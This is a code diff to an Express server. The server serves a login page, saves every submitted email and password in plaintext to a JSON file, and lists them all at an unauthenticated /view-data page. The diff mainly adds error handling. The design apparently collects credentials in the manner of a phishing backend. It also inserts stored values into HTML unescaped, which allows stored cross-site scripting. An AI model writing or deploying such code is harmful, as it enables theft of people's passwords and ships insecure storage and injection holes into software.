@@ -12,7 +12,7 @@ app.use(express.static('public')); // Serve static files from the "public" folde
 
 // Serve the login page at the root ("/")
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));  // Adjust this path to your HTML file
+    res.sendFile(path.join(__dirname, 'public', 'login.html'));  // Adjust this path to your HTML file
 });
 
 // Handle login POST request
@@ -23,18 +23,27 @@ app.post('/login', (req, res) => {
     const filePath = path.join(__dirname, 'data.json');
     let data = [];
 
-    if (fs.existsSync(filePath)) {
-        const fileData = fs.readFileSync(filePath);
-        data = JSON.parse(fileData);
+    try {
+        if (fs.existsSync(filePath)) {
+            const fileData = fs.readFileSync(filePath, 'utf8');
+            data = JSON.parse(fileData);
+        }
+    } catch (err) {
+        console.error('Error reading the file:', err);
+        return res.status(500).json({ message: 'Internal Server Error' });
     }
 
-    // Add new login
+    // Add new login data
     data.push({ email, password });
 
-    // Save updated data
-    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
-
-    res.json({ message: 'Login data stored successfully!' });
+    try {
+        // Save updated data
+        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+        res.json({ message: 'Login data stored successfully!' });
+    } catch (err) {
+        console.error('Error writing to the file:', err);
+        return res.status(500).json({ message: 'Error saving login data' });
+    }
 });
 
 // ✅ NEW: View login data in a table
@@ -45,8 +54,14 @@ app.get('/view-data', (req, res) => {
         return res.send('<p>No data found yet.</p>');
     }
 
-    const fileData = fs.readFileSync(filePath);
-    const data = JSON.parse(fileData);
+    let data = [];
+    try {
+        const fileData = fs.readFileSync(filePath, 'utf8');
+        data = JSON.parse(fileData);
+    } catch (err) {
+        console.error('Error reading the file:', err);
+        return res.status(500).json({ message: 'Error reading login data' });
+    }
 
     const rows = data.map(d => `<tr><td>${d.email}</td><td>${d.password}</td></tr>`).join('');
 
@@ -70,7 +85,7 @@ app.get('/view-data', (req, res) => {
       </table>
     </body>
     </html>
-  `;
+    `;
 
     res.send(html);
 });
